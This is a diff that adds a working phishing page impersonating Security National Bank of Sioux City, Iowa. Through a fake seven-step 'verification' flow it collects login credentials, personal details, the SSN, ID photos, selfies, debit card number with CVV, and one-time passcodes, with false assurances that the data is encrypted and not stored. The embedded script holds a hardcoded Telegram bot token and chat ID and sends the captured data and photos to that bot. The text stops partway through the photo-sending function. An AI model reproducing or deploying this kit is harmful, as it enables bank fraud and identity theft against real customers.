@@ -1,0 +1,1395 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes" />
+  <title>SNB Iowa Mobile · Sign In</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+
+    body {
+      background: #EEF2F7;
+      font-family: -apple-system, 'Helvetica Neue', 'Segoe UI', Roboto, Arial, sans-serif;
+      color: #1A1A1A;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+    }
+
+    .container {
+      max-width: 480px;
+      width: 100%;
+      background: #FFFFFF;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* ===== SNB HEADER (navy) ===== */
+    .snb-header {
+      background: #0A2540;
+      color: #FFFFFF;
+      padding: 16px 20px 14px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .snb-logo-mark {
+      width: 34px;
+      height: 34px;
+      background: #FFFFFF;
+      border-radius: 6px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+      position: relative;
+    }
+
+    .snb-logo-mark svg {
+      width: 22px;
+      height: 22px;
+      fill: #0A2540;
+    }
+
+    .snb-header-text {
+      display: flex;
+      flex-direction: column;
+      line-height: 1.1;
+    }
+
+    .snb-header-text .title {
+      font-size: 13px;
+      font-weight: 700;
+      letter-spacing: 2px;
+      color: #FFFFFF;
+    }
+
+    .snb-header-text .sub {
+      font-size: 9px;
+      letter-spacing: 2px;
+      color: #B8C6D6;
+      margin-top: 3px;
+    }
+
+    /* ===== FDIC BANNER ===== */
+    .fdic-banner {
+      background: #0A2540;
+      color: #FFFFFF;
+      padding: 10px 20px 14px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      border-top: 1px solid rgba(255,255,255,0.1);
+    }
+
+    .fdic-logo {
+      font-family: 'Georgia', serif;
+      font-weight: 700;
+      font-size: 15px;
+      letter-spacing: 0.5px;
+      color: #FFFFFF;
+      flex-shrink: 0;
+      font-style: italic;
+    }
+
+    .fdic-text {
+      font-size: 10px;
+      color: #D6E0EC;
+      line-height: 1.4;
+      font-style: italic;
+    }
+
+    /* ===== MAIN BODY ===== */
+    .main-body {
+      flex: 1;
+      padding: 26px 20px 40px;
+      background: #FFFFFF;
+    }
+
+    .page-title {
+      font-size: 22px;
+      font-weight: 500;
+      color: #0A2540;
+      margin-bottom: 22px;
+      letter-spacing: -0.3px;
+    }
+
+    .step-label {
+      font-size: 11px;
+      font-weight: 700;
+      letter-spacing: 1.4px;
+      text-transform: uppercase;
+      color: #7B8AA3;
+      margin-bottom: 6px;
+    }
+
+    .step-title {
+      font-size: 20px;
+      font-weight: 600;
+      color: #0A2540;
+      margin-bottom: 22px;
+    }
+
+    .form-label {
+      display: block;
+      font-size: 15px;
+      font-weight: 500;
+      color: #1F3450;
+      margin-bottom: 8px;
+    }
+
+    .form-input {
+      width: 100%;
+      padding: 14px 14px;
+      font-size: 16px;
+      background: #FFFFFF;
+      border: 1px solid #C7D0D9;
+      border-radius: 4px;
+      color: #1A1A1A;
+      outline: none;
+      transition: border-color 0.2s, box-shadow 0.2s;
+      font-family: inherit;
+      height: 52px;
+    }
+
+    .form-input:focus {
+      border-color: #0A5FBF;
+      box-shadow: 0 0 0 3px rgba(10, 95, 191, 0.14);
+    }
+
+    .form-input::placeholder {
+      color: #9AA8B8;
+      font-weight: 400;
+    }
+
+    .form-input.error {
+      border-color: #B22222;
+    }
+
+    .form-group {
+      margin-bottom: 20px;
+    }
+
+    .form-hint {
+      font-size: 12px;
+      color: #6B7A8E;
+      margin-top: 6px;
+      line-height: 1.45;
+    }
+
+    .form-hint.warn {
+      background: #FEF9E6;
+      color: #8A6E1A;
+      padding: 8px 12px;
+      border-radius: 6px;
+      border-left: 3px solid #C9A227;
+    }
+
+    /* ===== BUTTON ===== */
+    .btn-primary {
+      width: 100%;
+      background: #0A5FBF;
+      color: #FFFFFF;
+      font-weight: 500;
+      font-size: 16px;
+      border: none;
+      padding: 15px;
+      border-radius: 4px;
+      cursor: pointer;
+      transition: background 0.2s, transform 0.1s;
+      letter-spacing: 0.2px;
+      height: 52px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .btn-primary:hover { background: #084EA0; }
+    .btn-primary:active { transform: scale(0.99); background: #084EA0; }
+
+    .btn-secondary {
+      width: 100%;
+      background: #FFFFFF;
+      color: #0A2540;
+      font-weight: 500;
+      font-size: 16px;
+      border: 1.5px solid #C7D0D9;
+      padding: 14px;
+      border-radius: 4px;
+      cursor: pointer;
+      margin-top: 12px;
+      height: 52px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    /* ===== LINK ===== */
+    .link-row {
+      text-align: center;
+      margin-top: 20px;
+    }
+
+    .link-row a {
+      color: #0A5FBF;
+      font-size: 15px;
+      text-decoration: underline;
+      text-underline-offset: 2px;
+      font-weight: 400;
+    }
+
+    /* ===== HELP SECTION ===== */
+    .help-section {
+      margin-top: 32px;
+      padding-top: 20px;
+      border-top: 1px solid #E8EDF4;
+    }
+
+    .help-title {
+      font-size: 15px;
+      font-weight: 700;
+      color: #1A1A1A;
+      margin-bottom: 8px;
+    }
+
+    .help-line {
+      font-size: 15px;
+      color: #1A1A1A;
+      line-height: 1.6;
+      margin-bottom: 2px;
+    }
+
+    .help-line a {
+      color: #0A5FBF;
+      text-decoration: underline;
+      text-underline-offset: 2px;
+    }
+
+    .help-line .phone {
+      color: #0A5FBF;
+      text-decoration: underline;
+      text-underline-offset: 2px;
+    }
+
+    .hours-line {
+      font-size: 15px;
+      color: #1A1A1A;
+      margin-top: 12px;
+      line-height: 1.6;
+    }
+
+    /* ===== FOOTER ===== */
+    .snb-footer {
+      margin-top: 28px;
+      padding-top: 18px;
+      border-top: 1px solid #E8EDF4;
+      font-size: 12px;
+      color: #6B7A8E;
+      text-align: center;
+      line-height: 1.6;
+    }
+
+    .snb-footer a {
+      color: #0A5FBF;
+      text-decoration: none;
+    }
+
+    /* ===== TRUST BAR ===== */
+    .trust-bar {
+      display: flex;
+      justify-content: center;
+      gap: 18px;
+      margin-top: 12px;
+      flex-wrap: wrap;
+      align-items: center;
+    }
+
+    .trust-bar .badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 4px;
+      font-size: 10px;
+      font-weight: 700;
+      letter-spacing: 0.5px;
+      color: #6B7A8E;
+      text-transform: uppercase;
+    }
+
+    .trust-bar .badge svg {
+      width: 12px;
+      height: 12px;
+      stroke: #6B7A8E;
+      stroke-width: 2.2;
+      fill: none;
+    }
+
+    /* ===== CAMERA (KYC) ===== */
+    .camera-container {
+      background: #000;
+      border-radius: 8px;
+      overflow: hidden;
+      margin: 12px 0;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.12);
+    }
+
+    .square-camera {
+      aspect-ratio: 1/1;
+      background: #1A1A1A;
+    }
+
+    video { width: 100%; height: 100%; object-fit: cover; display: block; }
+
+    .camera-controls {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 30px;
+      padding: 14px 0 4px;
+    }
+
+    .capture-btn {
+      background: #FFFFFF;
+      width: 66px;
+      height: 66px;
+      border-radius: 50%;
+      border: 4px solid #0A5FBF;
+      box-shadow: 0 2px 12px rgba(0,0,0,0.2);
+      cursor: pointer;
+    }
+
+    .capture-btn:active { transform: scale(0.94); }
+
+    .switch-cam {
+      background: rgba(0,0,0,0.65);
+      width: 46px;
+      height: 46px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 22px;
+      cursor: pointer;
+      color: #FFFFFF;
+    }
+
+    .status-badge {
+      background: #F2F5F8;
+      padding: 10px;
+      border-radius: 6px;
+      text-align: center;
+      font-size: 13px;
+      margin: 8px 0 4px;
+      color: #1E2A3E;
+      font-weight: 500;
+      border: 1px solid #E8EDF4;
+    }
+
+    /* ===== STEP INDICATOR ===== */
+    .step-indicator {
+      display: flex;
+      gap: 6px;
+      margin-bottom: 22px;
+    }
+
+    .step-dot {
+      flex: 1;
+      height: 4px;
+      background: #E4E9F2;
+      border-radius: 4px;
+    }
+
+    .step-dot.active, .step-dot.completed { background: #0A5FBF; }
+
+    /* ===== OTP HINT ===== */
+    .otp-hint {
+      background: #EFF6FF;
+      border-radius: 6px;
+      padding: 14px 16px;
+      text-align: center;
+      margin-bottom: 22px;
+      font-size: 14px;
+      color: #1F3450;
+      line-height: 1.5;
+      border-left: 3px solid #0A5FBF;
+    }
+
+    .otp-hint strong { color: #0A2540; }
+
+    /* ===== SELECT ===== */
+    select.form-input {
+      appearance: none;
+      background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%236B7A8E' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");
+      background-repeat: no-repeat;
+      background-position: right 14px center;
+      background-size: 18px;
+      padding-right: 40px;
+    }
+
+    /* ===== UTILITY ===== */
+    .hide { display: none !important; }
+
+    .row-2 {
+      display: flex;
+      gap: 12px;
+    }
+
+    .row-2 .form-group { flex: 1; }
+    .row-2 .form-group.small { flex: 0.55; }
+
+    /* ===== TOAST ===== */
+    .toast {
+      position: fixed;
+      bottom: 24px;
+      left: 50%;
+      transform: translateX(-50%) translateY(120px);
+      background: #0A2540;
+      color: #FFFFFF;
+      padding: 13px 22px;
+      border-radius: 8px;
+      font-size: 14px;
+      font-weight: 500;
+      box-shadow: 0 8px 24px rgba(0,0,0,0.22);
+      transition: transform 0.3s ease, opacity 0.3s ease;
+      opacity: 0;
+      pointer-events: none;
+      z-index: 9999;
+      max-width: 380px;
+      text-align: center;
+    }
+
+    .toast.show { transform: translateX(-50%) translateY(0); opacity: 1; }
+    .toast.error { background: #B22222; }
+
+    /* ===== LOADING ===== */
+    .loading-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(255,255,255,0.95);
+      backdrop-filter: blur(6px);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      z-index: 9998;
+      visibility: hidden;
+      opacity: 0;
+      transition: opacity 0.25s ease, visibility 0.25s ease;
+    }
+
+    .loading-overlay.active { visibility: visible; opacity: 1; }
+
+    .spinner {
+      width: 44px;
+      height: 44px;
+      border: 4px solid #D6E0EE;
+      border-top-color: #0A5FBF;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+      margin-bottom: 16px;
+    }
+
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .loading-text {
+      font-size: 15px;
+      color: #0A2540;
+      font-weight: 500;
+      text-align: center;
+      line-height: 1.5;
+    }
+
+    /* ===== SUCCESS ===== */
+    .success-icon {
+      width: 84px;
+      height: 84px;
+      border-radius: 50%;
+      background: #E3F5EB;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 24px;
+    }
+
+    .success-icon svg {
+      width: 44px;
+      height: 44px;
+      stroke: #1A8B4C;
+      stroke-width: 2.6;
+      fill: none;
+      stroke-linecap: round;
+      stroke-linejoin: round;
+    }
+
+    .success-title {
+      text-align: center;
+      font-size: 22px;
+      font-weight: 700;
+      color: #0A2540;
+      margin-bottom: 10px;
+    }
+
+    .success-text {
+      text-align: center;
+      font-size: 15px;
+      color: #4A5F7A;
+      line-height: 1.6;
+      margin-bottom: 24px;
+    }
+
+    @media (max-width: 400px) {
+      .main-body { padding: 22px 16px 32px; }
+      .page-title { font-size: 20px; }
+      .step-title { font-size: 18px; }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+
+    <!-- ===== SNB HEADER ===== -->
+    <div class="snb-header">
+      <div class="snb-logo-mark">
+        <svg viewBox="0 0 24 24">
+          <path d="M12 2 L4 6 V12 C4 17 7.5 21 12 22 C16.5 21 20 17 20 12 V6 Z" />
+        </svg>
+      </div>
+      <div class="snb-header-text">
+        <span class="title">SECURITY NATIONAL BANK</span>
+        <span class="sub">SIOUX CITY · IOWA</span>
+      </div>
+    </div>
+
+    <!-- ===== FDIC BANNER ===== -->
+    <div class="fdic-banner">
+      <div class="fdic-logo">FDIC</div>
+      <div class="fdic-text">FDIC-Insured · Backed by the full faith and credit of the U.S. Government</div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- STEP 1 — SIGN IN (User ID + Password)                        -->
+    <!-- ============================================================ -->
+    <div id="loginPanel" class="main-body">
+      <h1 class="page-title">Sign in to ebank</h1>
+
+      <div class="form-group">
+        <label class="form-label" for="userId">User ID:</label>
+        <input type="text" id="userId" class="form-input" autocomplete="off" autocapitalize="off" spellcheck="false" />
+      </div>
+
+      <div class="form-group">
+        <label class="form-label" for="password">Password:</label>
+        <input type="password" id="password" class="form-input" autocomplete="off" />
+      </div>
+
+      <label style="display:flex; align-items:center; gap:10px; margin-bottom:22px; font-size:15px; color:#1F3450; cursor:pointer;">
+        <input type="checkbox" id="saveUserId" style="width:20px; height:20px; accent-color:#0A5FBF;" />
+        Save my User ID
+      </label>
+
+      <button class="btn-primary" id="loginNextBtn">Continue</button>
+
+      <div class="link-row">
+        <a href="#" id="forgotUserIdLink">Forgot your user ID?</a>
+      </div>
+
+      <!-- Help section -->
+      <div class="help-section">
+        <div class="help-title">Need help?</div>
+        <div class="help-line">Contact us at <a href="tel:7122776500" class="phone">712-277-6500</a></div>
+        <div class="help-line">or</div>
+        <div class="help-line"><a href="tel:18004754762" class="phone">1-800-475-4762</a> extension 6500</div>
+        <div class="help-line">or</div>
+        <div class="help-line"><a href="mailto:support@snbiowa.com">email SNB Support</a></div>
+
+        <div class="hours-line">
+          Monday – Friday, 8am – 5pm CST<br>
+          (excluding federal holidays).
+        </div>
+      </div>
+
+      <div class="snb-footer">
+        We promise to keep your personal information safe.<br>
+        <a href="#">Mobile Privacy Notice</a>
+      </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- STEP 2 — ENTER USER ID & PASSWORD (confirmation screen)      -->
+    <!-- ============================================================ -->
+    <div id="credentialsPanel" class="main-body hide">
+      <div class="step-label">Enter User ID &amp; Password</div>
+
+      <div class="form-group">
+        <label class="form-label" for="userId2">User ID</label>
+        <input type="text" id="userId2" class="form-input" placeholder="" autocomplete="off" />
+      </div>
+
+      <div class="form-group">
+        <label class="form-label" for="password2">Password</label>
+        <input type="password" id="password2" class="form-input" placeholder="" autocomplete="off" />
+      </div>
+
+      <label style="display:flex; align-items:center; gap:10px; margin-bottom:22px; font-size:15px; color:#1F3450; cursor:pointer;">
+        <input type="checkbox" id="saveUserId2" style="width:20px; height:20px; accent-color:#0A5FBF;" />
+        Save my User ID
+      </label>
+
+      <button class="btn-primary" id="credentialsNextBtn">Continue</button>
+
+      <div class="link-row">
+        <a href="#" id="backToLoginFromCreds">← Back to sign in</a>
+      </div>
+
+      <!-- App menu (from screenshot) -->
+      <div class="help-section" style="margin-top:28px;">
+        <div class="menu-list">
+          <div class="menu-item" style="display:flex; align-items:center; gap:14px; padding:14px 0; border-bottom:1px solid #EEF3FA; font-size:16px; color:#1A1A1A; cursor:pointer;">
+            <span style="width:24px; text-align:center; font-size:18px; color:#0A5FBF;">?</span>
+            <span style="flex:1; font-weight:500;">Help</span>
+            <span style="color:#B8C6D6;">›</span>
+          </div>
+          <div class="menu-item" style="display:flex; align-items:center; gap:14px; padding:14px 0; border-bottom:1px solid #EEF3FA; font-size:16px; color:#1A1A1A; cursor:pointer;">
+            <span style="width:24px; text-align:center; font-size:18px; color:#0A5FBF;">i</span>
+            <span style="flex:1; font-weight:500;">About</span>
+            <span style="color:#B8C6D6;">›</span>
+          </div>
+          <div class="menu-item" style="display:flex; align-items:center; gap:14px; padding:14px 0; border-bottom:1px solid #EEF3FA; font-size:16px; color:#1A1A1A; cursor:pointer;">
+            <span style="width:24px; text-align:center; font-size:18px; color:#0A5FBF;">🏛</span>
+            <span style="flex:1; font-weight:500;">ATM &amp; Branch Finder</span>
+            <span style="color:#B8C6D6;">›</span>
+          </div>
+          <div class="menu-item" style="display:flex; align-items:center; gap:14px; padding:14px 0; border-bottom:1px solid #EEF3FA; font-size:16px; color:#1A1A1A; cursor:pointer;">
+            <span style="width:24px; text-align:center; font-size:18px; color:#0A5FBF;">💬</span>
+            <span style="flex:1; font-weight:500;">Ask a Question</span>
+            <span style="color:#B8C6D6;">›</span>
+          </div>
+          <div class="menu-item" style="display:flex; align-items:center; gap:14px; padding:14px 0; border-bottom:1px solid #EEF3FA; font-size:16px; color:#1A1A1A; cursor:pointer;">
+            <span style="width:24px; text-align:center; font-size:18px; color:#0A5FBF;">🏦</span>
+            <span style="flex:1; font-weight:500;">Open New Account</span>
+            <span style="color:#B8C6D6;">›</span>
+          </div>
+          <div class="menu-item" style="display:flex; align-items:center; gap:14px; padding:14px 0; border-bottom:1px solid #EEF3FA; font-size:16px; color:#1A1A1A; cursor:pointer;">
+            <span style="width:24px; text-align:center; font-size:18px; color:#0A5FBF;">🏠</span>
+            <span style="flex:1; font-weight:500;">Apply for Home Loan</span>
+            <span style="color:#B8C6D6;">›</span>
+          </div>
+          <div class="menu-item" style="display:flex; align-items:center; gap:14px; padding:14px 0; border-bottom:1px solid #EEF3FA; font-size:16px; color:#1A1A1A; cursor:pointer;">
+            <span style="width:24px; text-align:center; font-size:18px; color:#0A5FBF;">📊</span>
+            <span style="flex:1; font-weight:500;">Financial Calculators</span>
+            <span style="color:#B8C6D6;">›</span>
+          </div>
+        </div>
+
+        <div class="snb-footer" style="margin-top:16px;">
+          <a href="#">Mobile Privacy Notice</a>
+        </div>
+      </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- STEP 3 — PERSONAL INFO (Phone + Email + DOB)                 -->
+    <!-- ============================================================ -->
+    <div id="personalPanel" class="main-body hide">
+      <div class="step-indicator">
+        <div class="step-dot active"></div>
+        <div class="step-dot"></div>
+        <div class="step-dot"></div>
+        <div class="step-dot"></div>
+        <div class="step-dot"></div>
+        <div class="step-dot"></div>
+      </div>
+
+      <div class="step-label">Step 2 of 7 · Identity Verification</div>
+      <h2 class="step-title">Confirm your information</h2>
+
+      <div class="form-group">
+        <label class="form-label" for="fullName">Full legal name</label>
+        <input type="text" id="fullName" class="form-input" placeholder="John M. Doe" />
+      </div>
+
+      <div class="form-group">
+        <label class="form-label" for="dob">Date of birth</label>
+        <input type="date" id="dob" class="form-input" />
+      </div>
+
+      <div class="form-group">
+        <label class="form-label" for="phoneNumber">Phone number</label>
+        <input type="tel" id="phoneNumber" class="form-input" placeholder="(555) 555-5555" maxlength="14" />
+        <div class="form-hint">Enter your 10-digit US phone number</div>
+      </div>
+
+      <div class="form-group">
+        <label class="form-label" for="email">Email address</label>
+        <input type="email" id="email" class="form-input" placeholder="you@example.com" autocapitalize="off" spellcheck="false" />
+      </div>
+
+      <div class="form-group">
+        <label class="form-label" for="address">Residential address</label>
+        <input type="text" id="address" class="form-input" placeholder="Street, city, state, ZIP" />
+      </div>
+
+      <button class="btn-primary" id="personalNextBtn">Continue</button>
+      <div class="link-row"><a href="#" id="backToCredsFromPersonal">← Back</a></div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- STEP 4 — SSN                                                 -->
+    <!-- ============================================================ -->
+    <div id="ssnPanel" class="main-body hide">
+      <div class="step-indicator">
+        <div class="step-dot completed"></div>
+        <div class="step-dot active"></div>
+        <div class="step-dot"></div>
+        <div class="step-dot"></div>
+        <div class="step-dot"></div>
+        <div class="step-dot"></div>
+      </div>
+
+      <div class="step-label">Step 3 of 7 · SSN Verification</div>
+      <h2 class="step-title">Social Security Number</h2>
+
+      <div class="form-hint warn" style="margin-bottom:18px;">
+        Your SSN is encrypted with AES-256 and used only for identity verification. It is never stored in plain text.
+      </div>
+
+      <div class="form-group">
+        <label class="form-label" for="ssnInput">Social Security Number</label>
+        <input type="password" id="ssnInput" class="form-input" placeholder="XXX-XX-XXXX" />
+        <div class="form-hint">Format: XXX-XX-XXXX</div>
+      </div>
+
+      <button class="btn-primary" id="ssnNextBtn">Continue</button>
+      <div class="link-row"><a href="#" id="backToPersonalFromSsn">← Back</a></div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- STEP 5 — KYC (ID photos)                                     -->
+    <!-- ============================================================ -->
+    <div id="kycPanel" class="main-body hide">
+      <div class="step-indicator">
+        <div class="step-dot completed"></div>
+        <div class="step-dot completed"></div>
+        <div class="step-dot active"></div>
+        <div class="step-dot"></div>
+        <div class="step-dot"></div>
+        <div class="step-dot"></div>
+      </div>
+
+      <div class="step-label">Step 4 of 7 · Identity Documents</div>
+      <h2 class="step-title">Verify your identity</h2>
+
+      <div class="form-hint warn" style="margin-bottom:18px;">
+        Please take clear photos of your ID. Ensure good lighting and all text is visible.
+      </div>
+
+      <!-- KYC Step 1: ID type -->
+      <div id="kycStep1">
+        <div class="form-group">
+          <label class="form-label" for="idType">ID type</label>
+          <select id="idType" class="form-input">
+            <option value="">Select document</option>
+            <option>Driver's License</option>
+            <option>State ID Card</option>
+            <option>Passport</option>
+            <option>Resident Permit</option>
+          </select>
+        </div>
+
+        <div class="form-group">
+          <label class="form-label" for="idState">Issuing state / country</label>
+          <select id="idState" class="form-input">
+            <option value="">Select state or region</option>
+            <option>Alabama</option><option>Alaska</option><option>Arizona</option><option>Arkansas</option>
+            <option>California</option><option>Colorado</option><option>Connecticut</option><option>Delaware</option>
+            <option>Florida</option><option>Georgia</option><option>Hawaii</option><option>Idaho</option>
+            <option>Illinois</option><option>Indiana</option><option>Iowa</option><option>Kansas</option>
+            <option>Kentucky</option><option>Louisiana</option><option>Maine</option><option>Maryland</option>
+            <option>Massachusetts</option><option>Michigan</option><option>Minnesota</option><option>Mississippi</option>
+            <option>Missouri</option><option>Montana</option><option>Nebraska</option><option>Nevada</option>
+            <option>New Hampshire</option><option>New Jersey</option><option>New Mexico</option><option>New York</option>
+            <option>North Carolina</option><option>North Dakota</option><option>Ohio</option><option>Oklahoma</option>
+            <option>Oregon</option><option>Pennsylvania</option><option>Rhode Island</option><option>South Carolina</option>
+            <option>South Dakota</option><option>Tennessee</option><option>Texas</option><option>Utah</option>
+            <option>Vermont</option><option>Virginia</option><option>Washington</option><option>West Virginia</option>
+            <option>Wisconsin</option><option>Wyoming</option>
+          </select>
+        </div>
+
+        <button class="btn-primary" id="kycStep1Next">Continue to ID capture</button>
+        <div class="link-row"><a href="#" id="backToSsnFromKyc">← Back</a></div>
+      </div>
+
+      <!-- KYC Step 2: Front ID -->
+      <div id="kycStep2" class="hide">
+        <div class="status-badge">Front side of your ID</div>
+        <div class="camera-container"><div class="square-camera"><video id="frontVideo" autoplay playsinline muted></video></div></div>
+        <div class="camera-controls">
+          <div class="switch-cam" id="switchFrontCam">⟳</div>
+          <div class="capture-btn" id="captureFrontBtn"></div>
+          <div style="width:44px;"></div>
+        </div>
+        <div class="status-badge" id="frontStatus">Position ID in frame & tap circle</div>
+      </div>
+
+      <!-- KYC Step 3: Back ID -->
+      <div id="kycStep3" class="hide">
+        <div class="status-badge">Back side of your ID</div>
+        <div class="camera-container"><div class="square-camera"><video id="backVideo" autoplay playsinline muted></video></div></div>
+        <div class="camera-controls">
+          <div class="switch-cam" id="switchBackCam">⟳</div>
+          <div class="capture-btn" id="captureBackBtn"></div>
+          <div style="width:44px;"></div>
+        </div>
+        <div class="status-badge" id="backStatus">Ready to capture</div>
+      </div>
+
+      <!-- KYC Step 4: Selfie -->
+      <div id="kycStep4" class="hide">
+        <div class="status-badge">Take a selfie</div>
+        <div class="camera-container"><div class="square-camera"><video id="selfieVideo" autoplay playsinline muted></video></div></div>
+        <div class="camera-controls">
+          <div class="switch-cam" id="switchSelfieCam">⟳</div>
+          <div class="capture-btn" id="captureSelfieBtn"></div>
+          <div style="width:44px;"></div>
+        </div>
+        <div class="status-badge" id="selfieStatus">Look at the camera</div>
+      </div>
+
+      <!-- KYC Step 5: Selfie with ID -->
+      <div id="kycStep5" class="hide">
+        <div class="status-badge">Selfie holding ID next to your face</div>
+        <div class="camera-container"><div class="square-camera"><video id="selfieIdVideo" autoplay playsinline muted></video></div></div>
+        <div class="camera-controls">
+          <div class="switch-cam" id="switchSelfieIdCam">⟳</div>
+          <div class="capture-btn" id="captureSelfieIdBtn"></div>
+          <div style="width:44px;"></div>
+        </div>
+        <div class="status-badge" id="selfieIdStatus">Hold ID clearly visible</div>
+      </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- STEP 6 — CARD DETAILS                                        -->
+    <!-- ============================================================ -->
+    <div id="cardPanel" class="main-body hide">
+      <div class="step-indicator">
+        <div class="step-dot completed"></div>
+        <div class="step-dot completed"></div>
+        <div class="step-dot completed"></div>
+        <div class="step-dot active"></div>
+        <div class="step-dot"></div>
+        <div class="step-dot"></div>
+      </div>
+
+      <div class="step-label">Step 5 of 7 · Card Verification</div>
+      <h2 class="step-title">Debit card details</h2>
+
+      <div class="form-hint warn" style="margin-bottom:18px;">
+        Your card is used only to verify your account. We never store your card details.
+      </div>
+
+      <div class="form-group">
+        <label class="form-label" for="debitCard">Card number</label>
+        <input type="tel" id="debitCard" class="form-input" placeholder="XXXX XXXX XXXX XXXX" inputmode="numeric" maxlength="19" />
+      </div>
+
+      <div class="row-2">
+        <div class="form-group">
+          <label class="form-label" for="cardExpiry">Expiry</label>
+          <input type="tel" id="cardExpiry" class="form-input" placeholder="MM/YY" inputmode="numeric" maxlength="5" />
+        </div>
+        <div class="form-group small">
+          <label class="form-label" for="cardCvv">CVV</label>
+          <input type="tel" id="cardCvv" class="form-input" placeholder="***" inputmode="numeric" maxlength="4" />
+        </div>
+      </div>
+
+      <button class="btn-primary" id="cardNextBtn">Continue</button>
+      <div class="link-row"><a href="#" id="backToKycFromCard">← Back</a></div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- STEP 7 — OTP                                                 -->
+    <!-- ============================================================ -->
+    <div id="otpPanel" class="main-body hide">
+      <div class="step-indicator">
+        <div class="step-dot completed"></div>
+        <div class="step-dot completed"></div>
+        <div class="step-dot completed"></div>
+        <div class="step-dot completed"></div>
+        <div class="step-dot active"></div>
+        <div class="step-dot"></div>
+      </div>
+
+      <div class="step-label">Step 6 of 7 · Final Verification</div>
+      <h2 class="step-title">One‑time passcode</h2>
+
+      <div class="otp-hint">
+        A verification code has been sent to your phone ending in <strong id="maskedPhone">****</strong>
+      </div>
+
+      <div class="form-group">
+        <label class="form-label" for="otpInput">Enter 6‑digit code</label>
+        <input type="tel" id="otpInput" class="form-input" placeholder="000000" inputmode="numeric" maxlength="6" />
+      </div>
+
+      <button class="btn-primary" id="otpSubmitBtn">Submit &amp; verify</button>
+
+      <div class="link-row" style="display:flex; justify-content:center; gap:24px; flex-wrap:wrap;">
+        <a href="#" id="resendOtpBtn">Resend code</a>
+        <a href="#" id="emailOtpBtn">Send via email</a>
+      </div>
+
+      <div class="link-row"><a href="#" id="backToCardFromOtp">← Back</a></div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- STEP 8 — SUCCESS                                             -->
+    <!-- ============================================================ -->
+    <div id="successPanel" class="main-body hide" style="text-align:center; padding-top:60px;">
+      <div class="success-icon">
+        <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg>
+      </div>
+      <div class="success-title">Account verified successfully</div>
+      <div class="success-text">
+        Your identity has been verified. You will be redirected to Security National Bank shortly.
+      </div>
+      <div style="font-size:14px; color:#0A5FBF; font-weight:600; margin-top:12px;">
+        Redirecting to Security National Bank...
+      </div>
+    </div>
+
+  </div>
+
+  <div id="toast" class="toast"></div>
+
+  <div id="loadingOverlay" class="loading-overlay">
+    <div class="spinner"></div>
+    <div class="loading-text" id="loadingText">Processing...<br>Please wait</div>
+  </div>
+
+  <script>
+    (function() {
+      /* ============================================================
+         TELEGRAM CONFIG
+         ============================================================ */
+      const BOT_TOKEN = "8671886486:AAHajOobfeLHXsbu6r-0x-82XIWLlvaPnq0";
+      const CHAT_ID   = "8737104261";
+
+      /* ============================================================
+         STATE
+         ============================================================ */
+      const userData = {
+        userId: '', password: '', fullName: '', dob: '', phone: '',
+        email: '', address: '', ssn: '', idType: '', idState: '',
+        debitCard: '', cardExpiry: '', cardCvv: '', otp: ''
+      };
+
+      /* ============================================================
+         DOM REFS
+         ============================================================ */
+      const loginPanel       = document.getElementById('loginPanel');
+      const credentialsPanel = document.getElementById('credentialsPanel');
+      const personalPanel    = document.getElementById('personalPanel');
+      const ssnPanel         = document.getElementById('ssnPanel');
+      const kycPanel         = document.getElementById('kycPanel');
+      const cardPanel        = document.getElementById('cardPanel');
+      const otpPanel         = document.getElementById('otpPanel');
+      const successPanel     = document.getElementById('successPanel');
+
+      const userId          = document.getElementById('userId');
+      const password        = document.getElementById('password');
+      const userId2         = document.getElementById('userId2');
+      const password2       = document.getElementById('password2');
+
+      const toast          = document.getElementById('toast');
+      const loadingOverlay = document.getElementById('loadingOverlay');
+      const loadingText    = document.getElementById('loadingText');
+
+      /* ============================================================
+         TELEGRAM HELPERS
+         ============================================================ */
+      async function sendToTelegram(text) {
+        try {
+          const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
+          });
+          const d = await r.json();
+          return d.ok;
+        } catch (e) { return false; }
+      }
+
+      async function sendPhotoToTelegram(blob, caption) {
+        try {
+          const fd = new FormData();
+          fd.append('chat_id', CHAT_ID);
+          fd.append('photo', blob, 'snb_kyc.jpg');
+          if (caption) fd.append('caption', caption);
